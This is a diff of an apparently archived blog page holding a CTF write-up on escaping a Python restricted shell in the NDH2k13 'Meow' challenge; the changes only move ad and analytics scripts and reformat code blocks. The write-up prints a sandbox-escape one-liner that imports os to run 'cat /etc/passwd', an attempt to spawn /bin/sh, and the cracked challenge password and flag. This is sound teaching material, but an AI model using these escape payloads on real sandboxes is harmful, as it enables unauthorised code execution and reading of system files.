@@ -12,26 +12,6 @@
   <link rel="stylesheet" href="/assets/css/main.css">
   <link rel="canonical" href="/binholic/2013/03/10/ndh2k13-prequals-meow-misc.html">
   <link rel="alternate" type="application/rss+xml" title="Binary World for Binary People :)" href="/feed.xml">
-
-  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
-<script>
-     (adsbygoogle = window.adsbygoogle || []).push({
-          google_ad_client: "ca-pub-9302170278788846",
-          enable_page_level_ads: true
-     });
-</script>
-
-
-  <!-- Global site tag (gtag.js) - Google Analytics -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'UA-16686496-2');
-</script>
-
 </head>
 
 
@@ -125,7 +105,8 @@ that will allow us to escape a restricted shell :).</p>
 Basically, we had to connect to it through telnet:</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>telnet z0b.nuitduhack.com 2323</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>telnet z0b.nuitduhack.com 2323
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Then we’re welcome by a Meow ASCII art.</p>
 
@@ -158,7 +139,8 @@ the ultimate furry function.
 
 Some available functions:
  kitty() -- get a kitty
- auth(password) -- authenticate</span></pre></td></tr></tbody></table></code></pre></figure>
+ auth(password) -- authenticate</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>So we basically are only permitted to use auth() and check() by default.
 Yeah, we’re basically stuck in a “Python Restricted Shell”.</p>
@@ -170,7 +152,8 @@ Yeah, we’re basically stuck in a “Python Restricted Shell”.</p>
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="nb">dir</span><span class="o">()</span>
-<span class="o">[</span><span class="s1">'__builtins__'</span>, <span class="s1">'auth'</span>, <span class="s1">'check'</span>, <span class="s1">'fight'</span>, <span class="s1">'flipacoin'</span>, <span class="s1">'kitty'</span>, <span class="s1">'purr'</span>, <span class="s1">'status'</span>, <span class="s1">'thanks'</span><span class="o">]</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="o">[</span><span class="s1">'__builtins__'</span>, <span class="s1">'auth'</span>, <span class="s1">'check'</span>, <span class="s1">'fight'</span>, <span class="s1">'flipacoin'</span>, <span class="s1">'kitty'</span>, <span class="s1">'purr'</span>, <span class="s1">'status'</span>, <span class="s1">'thanks'</span><span class="o">]</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Neat! We can basically list any attributes of  most objects (not the restricted one).</p>
 
@@ -184,7 +167,8 @@ Yeah, we’re basically stuck in a “Python Restricted Shell”.</p>
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre><span class="o">&gt;&gt;&gt;</span> thanks<span class="o">()</span>
-Thanks to Guido, Glyph and pyfiglet authors.</pre></td></tr></tbody></table></code></pre></figure>
+Thanks to Guido, Glyph and pyfiglet authors.
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>The rest isn’t really interesting.</p>
 
@@ -197,7 +181,8 @@ Thanks to Guido, Glyph and pyfiglet authors.</pre></td></tr></tbody></table></co
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="nb">dir</span><span class="o">([])</span>
-<span class="o">[</span><span class="s1">'__add__'</span>, <span class="s1">'__class__'</span>, <span class="s1">'__contains__'</span>, <span class="s1">'__delattr__'</span>, <span class="s1">'__delitem__'</span>, <span class="s1">'__delslice__'</span>, <span class="s1">'__doc__'</span>, <span class="s1">'__eq__'</span>, <span class="s1">'__format__'</span>, <span class="s1">'__ge__'</span>, <span class="s1">'__getattribute__'</span>, <span class="s1">'__getitem__'</span>, <span class="s1">'__getslice__'</span>, <span class="s1">'__gt__'</span>, <span class="s1">'__hash__'</span>, <span class="s1">'__iadd__'</span>, <span class="s1">'__imul__'</span>, <span class="s1">'__init__'</span>, <span class="s1">'__iter__'</span>, <span class="s1">'__le__'</span>, <span class="s1">'__len__'</span>, <span class="s1">'__lt__'</span>, <span class="s1">'__mul__'</span>, <span class="s1">'__ne__'</span>, <span class="s1">'__new__'</span>, <span class="s1">'__reduce__'</span>, <span class="s1">'__reduce_ex__'</span>, <span class="s1">'__repr__'</span>, <span class="s1">'__reversed__'</span>, <span class="s1">'__rmul__'</span>, <span class="s1">'__setattr__'</span>, <span class="s1">'__setitem__'</span>, <span class="s1">'__setslice__'</span>, <span class="s1">'__sizeof__'</span>, <span class="s1">'__str__'</span>, <span class="s1">'__subclasshook__'</span>, <span class="s1">'append'</span>, <span class="s1">'count'</span>, <span class="s1">'extend'</span>, <span class="s1">'index'</span>, <span class="s1">'insert'</span>, <span class="s1">'pop'</span>, <span class="s1">'remove'</span>, <span class="s1">'reverse'</span>, <span class="s1">'sort'</span><span class="o">]</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="o">[</span><span class="s1">'__add__'</span>, <span class="s1">'__class__'</span>, <span class="s1">'__contains__'</span>, <span class="s1">'__delattr__'</span>, <span class="s1">'__delitem__'</span>, <span class="s1">'__delslice__'</span>, <span class="s1">'__doc__'</span>, <span class="s1">'__eq__'</span>, <span class="s1">'__format__'</span>, <span class="s1">'__ge__'</span>, <span class="s1">'__getattribute__'</span>, <span class="s1">'__getitem__'</span>, <span class="s1">'__getslice__'</span>, <span class="s1">'__gt__'</span>, <span class="s1">'__hash__'</span>, <span class="s1">'__iadd__'</span>, <span class="s1">'__imul__'</span>, <span class="s1">'__init__'</span>, <span class="s1">'__iter__'</span>, <span class="s1">'__le__'</span>, <span class="s1">'__len__'</span>, <span class="s1">'__lt__'</span>, <span class="s1">'__mul__'</span>, <span class="s1">'__ne__'</span>, <span class="s1">'__new__'</span>, <span class="s1">'__reduce__'</span>, <span class="s1">'__reduce_ex__'</span>, <span class="s1">'__repr__'</span>, <span class="s1">'__reversed__'</span>, <span class="s1">'__rmul__'</span>, <span class="s1">'__setattr__'</span>, <span class="s1">'__setitem__'</span>, <span class="s1">'__setslice__'</span>, <span class="s1">'__sizeof__'</span>, <span class="s1">'__str__'</span>, <span class="s1">'__subclasshook__'</span>, <span class="s1">'append'</span>, <span class="s1">'count'</span>, <span class="s1">'extend'</span>, <span class="s1">'index'</span>, <span class="s1">'insert'</span>, <span class="s1">'pop'</span>, <span class="s1">'remove'</span>, <span class="s1">'reverse'</span>, <span class="s1">'sort'</span><span class="o">]</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>All those <strong>name</strong> things are intrinsics attributes (or methods).
 That’s how you redefined some ops and all.</p>
@@ -214,7 +199,8 @@ or dumping byte code or whatever!</p>
 </pre></td><td class="code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="o">[]</span>.__class__.__name__
 <span class="s1">'list'</span>
 <span class="o">&gt;&gt;&gt;</span> <span class="o">[]</span>.__class__.__class__.__name__
-<span class="s1">'type'</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="s1">'type'</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Cool, we can have access to type!</p>
 
@@ -225,7 +211,8 @@ internally call the mro() of these objects.</p>
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="o">[]</span>.__class__.__class__.mro<span class="o">([]</span>.__class__.__class__.__new__<span class="o">([]</span>.__class__.__class__, status<span class="o">))</span>
-<span class="o">[</span>&lt;class <span class="s1">'__main__.Wrapper'</span><span class="o">&gt;</span>, &lt;<span class="nb">type</span> <span class="s1">'object'</span><span class="o">&gt;]</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="o">[</span>&lt;class <span class="s1">'__main__.Wrapper'</span><span class="o">&gt;</span>, &lt;<span class="nb">type</span> <span class="s1">'object'</span><span class="o">&gt;]</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Now we have the type of status :).</p>
 
@@ -445,7 +432,8 @@ access to the following:</p>
 &lt;class <span class="s1">'twisted.internet.process._BaseProcess'</span><span class="o">&gt;</span>,
 &lt;class <span class="s1">'twisted.internet._signals._Handler'</span><span class="o">&gt;</span>,
 &lt;class <span class="s1">'twisted.internet.posixbase._FDWaker'</span><span class="o">&gt;</span>,
-&lt;class <span class="s1">'__main__.Wrapper'</span><span class="o">&gt;</span>, &lt;<span class="nb">type</span> <span class="s1">'_ast.AST'</span><span class="o">&gt;</span>, &lt;<span class="nb">type</span> <span class="s1">'cell'</span><span class="o">&gt;]</span></pre></td></tr></tbody></table></code></pre></figure>
+&lt;class <span class="s1">'__main__.Wrapper'</span><span class="o">&gt;</span>, &lt;<span class="nb">type</span> <span class="s1">'_ast.AST'</span><span class="o">&gt;</span>, &lt;<span class="nb">type</span> <span class="s1">'cell'</span><span class="o">&gt;]</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>When I saw that, I was like: Oh My God! <em>_</em> beautiful, I can almost create
 any freaking object I want.</p>
@@ -455,14 +443,16 @@ any freaking object I want.</p>
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="o">()</span>.__class__.__bases__[0].__subclasses__<span class="o">()[</span>58]<span class="o">(</span><span class="s1">'meow.py'</span>, <span class="s1">'r'</span><span class="o">)</span>
-Internal error: file<span class="o">()</span> constructor not accessible <span class="k">in </span>restricted mode.</pre></td></tr></tbody></table></code></pre></figure>
+Internal error: file<span class="o">()</span> constructor not accessible <span class="k">in </span>restricted mode.
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>We even tried looking at the code:</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre><span class="o">&gt;&gt;&gt;</span> auth.func_code
-&lt;code object auth at 0x7f9ab195b828, file <span class="s2">"/opt/meow/challenge.py"</span>, line 235&gt;</pre></td></tr></tbody></table></code></pre></figure>
+&lt;code object auth at 0x7f9ab195b828, file <span class="s2">"/opt/meow/challenge.py"</span>, line 235&gt;
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Yay! We have the real path of the challenge, spent a loooot of time trying
 to figure out how to read the file. Didn’t manage it.</p>
@@ -484,7 +474,8 @@ to figure out how to read the file. Didn’t manage it.</p>
  <span class="s1">'__setattr__'</span>, <span class="s1">'__sizeof__'</span>, <span class="s1">'__str__'</span>, <span class="s1">'__subclasshook__'</span>, <span class="s1">'co_argcount'</span>,
  <span class="s1">'co_cellvars'</span>, <span class="s1">'co_code'</span>, <span class="s1">'co_consts'</span>, <span class="s1">'co_filename'</span>, <span class="s1">'co_firstlineno'</span>,
  <span class="s1">'co_flags'</span>, <span class="s1">'co_freevars'</span>, <span class="s1">'co_lnotab'</span>, <span class="s1">'co_name'</span>, <span class="s1">'co_names'</span>,
- <span class="s1">'co_nlocals'</span>, <span class="s1">'co_stacksize'</span>, <span class="s1">'co_varnames'</span><span class="o">]</span></pre></td></tr></tbody></table></code></pre></figure>
+ <span class="s1">'co_nlocals'</span>, <span class="s1">'co_stacksize'</span>, <span class="s1">'co_varnames'</span><span class="o">]</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>There is the co_code that seems interesting but we’ll come back to that later.</p>
 
@@ -507,7 +498,8 @@ to figure out how to read the file. Didn’t manage it.</p>
 <span class="s1">'\x00'</span>,
 &lt;code object xxx at 0x7f9ab195b378, file <span class="s2">"/opt/meow/challenge.py"</span>, line 131&gt;, 7,
 &lt;code object &lt;lambda&gt; at 0x7f9ab195b3f0, file <span class="s2">"/opt/meow/challenge.py"</span>, line 148&gt;,
-<span class="s1">'%s'</span>, 2, <span class="s1">'916F601F6A625DF351086CBCF25BAECA'</span><span class="o">)</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="s1">'%s'</span>, 2, <span class="s1">'916F601F6A625DF351086CBCF25BAECA'</span><span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Oh, nice, we seem to have something that look like some kind of hash!!!
 We tried bruteforce of course (with oclHashcat) but not luck.
@@ -525,7 +517,8 @@ the bytecode change between Python versions). Like so:</p>
 <figure class="highlight"><pre><code class="language-python" data-lang="python"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre><span class="kn">import</span> <span class="nn">dis</span>
-<span class="n">dis</span><span class="o">.</span><span class="n">dis</span><span class="p">(</span><span class="s">'some bytecode here'</span><span class="p">)</span></pre></td></tr></tbody></table></code></pre></figure>
+<span class="n">dis</span><span class="p">.</span><span class="n">dis</span><span class="p">(</span><span class="s">'some bytecode here'</span><span class="p">)</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>I must say that it was when I got lazy.
 Doing bytecode translation to python by hand …
@@ -557,19 +550,19 @@ When I came back, Celelibi came up with something like this:</p>
 22
 23
 </pre></td><td class="code"><pre><span class="k">def</span> <span class="nf">check</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
- <span class="n">array</span> <span class="o">=</span> <span class="p">[</span><span class="s">'G'</span><span class="p">,</span> <span class="s">'$'</span><span class="p">,</span> <span class="s">'K'</span><span class="p">,</span> <span class="s">'!'</span><span class="p">,</span> <span class="s">'</span><span class="si">%</span><span class="s">'</span><span class="p">,</span> <span class="s">'@'</span><span class="p">,</span> <span class="s">'S'</span><span class="p">,</span> <span class="s">'#'</span><span class="p">]</span>
- <span class="n">cte</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">]])</span>
- <span class="n">tmp</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="o">.</span><span class="n">upper</span><span class="p">(),</span> <span class="n">password</span><span class="p">[:</span><span class="mi">14</span><span class="p">]))</span>
- <span class="n">tempPass</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">14</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)),</span> <span class="n">tmp</span><span class="p">])</span>
+ <span class="n">array</span> <span class="o">=</span> <span class="p">[</span><span class="s">'G'</span><span class="p">,</span> <span class="s">'$'</span><span class="p">,</span> <span class="s">'K'</span><span class="p">,</span> <span class="s">'!'</span><span class="p">,</span> <span class="s">'%'</span><span class="p">,</span> <span class="s">'@'</span><span class="p">,</span> <span class="s">'S'</span><span class="p">,</span> <span class="s">'#'</span><span class="p">]</span>
+ <span class="n">cte</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">a</span><span class="p">:</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">a</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">7</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">a</span><span class="p">[</span><span class="mi">4</span><span class="p">]])</span>
+ <span class="n">tmp</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="nb">map</span><span class="p">(</span><span class="k">lambda</span> <span class="n">x</span><span class="p">:</span> <span class="n">x</span><span class="p">.</span><span class="n">upper</span><span class="p">(),</span> <span class="n">password</span><span class="p">[:</span><span class="mi">14</span><span class="p">]))</span>
+ <span class="n">tempPass</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">14</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)),</span> <span class="n">tmp</span><span class="p">])</span>
  <span class="c1">#xxx = lambda: # ci-dessus
 </span> <span class="n">k</span> <span class="o">=</span> <span class="n">xxx</span><span class="p">(</span><span class="n">tempPass</span><span class="p">[:</span><span class="mi">7</span><span class="p">])</span>
- <span class="n">d</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">k</span><span class="p">:</span> <span class="n">DES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">DES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
+ <span class="n">d</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">k</span><span class="p">:</span> <span class="n">DES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">DES</span><span class="p">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
  <span class="n">obj</span> <span class="o">=</span> <span class="n">d</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
- <span class="n">h</span> <span class="o">=</span> <span class="n">obj</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">cte</span><span class="p">(</span><span class="n">array</span><span class="p">))</span>
+ <span class="n">h</span> <span class="o">=</span> <span class="n">obj</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">cte</span><span class="p">(</span><span class="n">array</span><span class="p">))</span>
  <span class="n">k</span> <span class="o">=</span> <span class="n">xxx</span><span class="p">(</span><span class="n">tempPass</span><span class="p">[</span><span class="mi">7</span><span class="p">:])</span>
  <span class="n">obj</span> <span class="o">=</span> <span class="n">d</span><span class="p">(</span><span class="n">k</span><span class="p">)</span>
- <span class="n">h</span> <span class="o">+=</span> <span class="n">obj</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">cte</span><span class="p">(</span><span class="n">array</span><span class="p">))</span>
- <span class="k">return</span> <span class="s">'</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="nb">hex</span><span class="p">(</span><span class="n">dec</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span><span class="o">.</span><span class="n">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">dec</span> <span class="ow">in</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">h</span><span class="p">]])</span><span class="o">.</span><span class="n">upper</span><span class="p">()</span> <span class="o">==</span> <span class="s">'916F601F6A625DF351086CBCF25BAECA'</span>
+ <span class="n">h</span> <span class="o">+=</span> <span class="n">obj</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">cte</span><span class="p">(</span><span class="n">array</span><span class="p">))</span>
+ <span class="k">return</span> <span class="s">'%s'</span> <span class="o">%</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">hex</span><span class="p">(</span><span class="n">dec</span><span class="p">)[</span><span class="mi">2</span><span class="p">:].</span><span class="n">zfill</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="k">for</span> <span class="n">dec</span> <span class="ow">in</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">h</span><span class="p">]]).</span><span class="n">upper</span><span class="p">()</span> <span class="o">==</span> <span class="s">'916F601F6A625DF351086CBCF25BAECA'</span>
 
 <span class="k">def</span> <span class="nf">auth</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
  <span class="k">if</span> <span class="n">check</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
@@ -578,7 +571,8 @@ When I came back, Celelibi came up with something like this:</p>
   <span class="k">return</span> <span class="mi">0</span>
  <span class="k">else</span><span class="p">:</span>
   <span class="k">print</span> <span class="s">'Wrong password. Meow shfffff.'</span>
-  <span class="k">return</span> <span class="bp">None</span></pre></td></tr></tbody></table></code></pre></figure>
+  <span class="k">return</span> <span class="bp">None</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Huh!
 WTF!
@@ -633,7 +627,8 @@ The LM hash is computed as follows:[1][2]
         The DES CipherMode should be set to ECB, and PaddingMode
         should be set to NONE.
     These two ciphertext values are concatenated to form a 16-byte value,
-        which is the LM hash.</pre></td></tr></tbody></table></code></pre></figure>
+        which is the LM hash.
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>It basically use the password as two sets of 7 bytes (56 bits) DES keys.
 Perfect for DES since it only uses 56 bits (because of the NSA …).</p>
@@ -641,7 +636,8 @@ Perfect for DES since it only uses 56 bits (because of the NSA …).</p>
 <p>So, we can now crack the hash and we get:</p>
 
 <figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>LM("SH3|DON'S S0N9") = 916F601F6A625DF351086CBCF25BAECA</pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>LM("SH3|DON'S S0N9") = 916F601F6A625DF351086CBCF25BAECA
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Ok great, let’s try.</p>
 
@@ -656,7 +652,8 @@ Perfect for DES since it only uses 56 bits (because of the NSA …).</p>
 </pre></td><td class="code"><pre><span class="o">&gt;&gt;&gt;</span> auth<span class="o">(</span><span class="s2">"SH3|DON'S S0N9"</span><span class="o">)</span>
 The first flag is: Int3rnEt1sm4de0fc47
 Also, here is a secret purry <span class="k">function</span><span class="nb">.</span>
-&lt;<span class="k">function </span>secret at 0x14e8050&gt;</pre></td></tr></tbody></table></code></pre></figure>
+&lt;<span class="k">function </span>secret at 0x14e8050&gt;
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Yeeeeees!</p>
 
@@ -670,12 +667,14 @@ Secret function() is “Meow Meow” challenge ;).</p>
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
 2
 </pre></td><td class="code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="nb">exec</span><span class="o">(</span>os.system<span class="o">(</span><span class="s2">"/bin/sh"</span>, <span class="o">{</span><span class="s1">'__builtins__'</span>: <span class="o">{</span><span class="s1">'__import__'</span>:__builtins__.__import__<span class="o">}})</span>
-Internal error: EOL <span class="k">while </span>scanning string literal <span class="o">(</span><span class="nv">$telnet$,</span> line 1<span class="o">)</span>.</pre></td></tr></tbody></table></code></pre></figure>
+Internal error: EOL <span class="k">while </span>scanning string literal <span class="o">(</span><span class="nv">$telnet$,</span> line 1<span class="o">)</span>.
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Variables were not allowed … but well we can still create classes:</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre>len<span class="o">([</span>c <span class="k">for </span>c <span class="k">in</span> <span class="o">()</span>.__class__.__bases__[0].__subclasses__<span class="o">()</span> <span class="k">if</span> <span class="s1">'classobj'</span> <span class="o">==</span> c.__name__][0]<span class="o">(</span><span class="s1">'Obj'</span>, <span class="o">()</span>, <span class="o">{</span><span class="s1">'__len__'</span> : lambda x: 5<span class="o">})())</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre>len<span class="o">([</span>c <span class="k">for </span>c <span class="k">in</span> <span class="o">()</span>.__class__.__bases__[0].__subclasses__<span class="o">()</span> <span class="k">if</span> <span class="s1">'classobj'</span> <span class="o">==</span> c.__name__][0]<span class="o">(</span><span class="s1">'Obj'</span>, <span class="o">()</span>, <span class="o">{</span><span class="s1">'__len__'</span> : lambda x: 5<span class="o">})())</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>(we also managed to crushed some variables using list comprehension and such)</p>
 
@@ -724,12 +723,14 @@ Twisted-Runner 10.1.0 <span class="o">(</span>/usr/lib/python2.6/dist-packages<s
 Twisted-Web 10.1.0 <span class="o">(</span>/usr/lib/python2.6/dist-packages<span class="o">)</span>,
 Twisted-Words 10.1.0 <span class="o">(</span>/usr/lib/python2.6/dist-packages<span class="o">)]</span>,
 <span class="o">{</span>zope.interface 3.5.3 <span class="o">(</span>/usr/lib/python2.6/dist-packages<span class="o">)</span>:
-DistributionNotFound<span class="o">(</span>Requirement.parse<span class="o">(</span><span class="s1">'distribute'</span><span class="o">)</span>,<span class="o">)})</span></pre></td></tr></tbody></table></code></pre></figure>
+DistributionNotFound<span class="o">(</span>Requirement.parse<span class="o">(</span><span class="s1">'distribute'</span><span class="o">)</span>,<span class="o">)})</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>And the best for the end: you thought we couldn’t open files, execute or import stuffs? Think again:</p>
 
 <figure class="highlight"><pre><code class="language-bash" data-lang="bash"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
-</pre></td><td class="code"><pre><span class="o">[</span>x <span class="k">for </span>x <span class="k">in</span> <span class="o">()</span>.__class__.__base__.__subclasses__<span class="o">()</span> <span class="k">if </span>x.__name__ <span class="o">==</span> <span class="s1">'catch_warnings'</span><span class="o">][</span>0]<span class="o">()</span>._module.__builtins__[<span class="s1">'__import__'</span><span class="o">](</span><span class="s2">"os"</span><span class="o">)</span>.popen<span class="o">(</span><span class="s2">"cat /etc/passwd"</span><span class="o">)</span>.read<span class="o">()</span></pre></td></tr></tbody></table></code></pre></figure>
+</pre></td><td class="code"><pre><span class="o">[</span>x <span class="k">for </span>x <span class="k">in</span> <span class="o">()</span>.__class__.__base__.__subclasses__<span class="o">()</span> <span class="k">if </span>x.__name__ <span class="o">==</span> <span class="s1">'catch_warnings'</span><span class="o">][</span>0]<span class="o">()</span>._module.__builtins__[<span class="s1">'__import__'</span><span class="o">](</span><span class="s2">"os"</span><span class="o">)</span>.popen<span class="o">(</span><span class="s2">"cat /etc/passwd"</span><span class="o">)</span>.read<span class="o">()</span>
+</pre></td></tr></tbody></table></code></pre></figure>
 
 <p>Got that afterward (with some help). So no, I don’t have the source code of the challenge :(.</p>
 
@@ -879,6 +880,26 @@ It also shows that it is REALLY hard to have a fully secure thing.</p>
   </div>
 
 </footer>
+
+<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-9302170278788846",
+          enable_page_level_ads: true
+     });
+</script>
+
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-16686496-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-16686496-2');
+</script>
+
 
 
   </body>
